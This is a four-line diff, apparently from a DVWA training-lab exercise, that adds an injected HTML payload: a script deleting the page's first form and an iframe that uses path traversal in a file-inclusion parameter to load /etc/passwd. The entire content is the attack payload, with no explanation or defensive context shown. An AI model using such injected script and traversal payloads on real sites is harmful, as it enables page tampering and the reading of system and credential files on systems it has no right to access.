@@ -1,0 +1,4 @@
+<script>
+document.forms[0].parentNode.removeChild(document.forms[0]);
+</script>
+<iframe src="http://dvwa.local/vulnerabilities/fi/?page=../../../../../etc/passwd"></iframe>
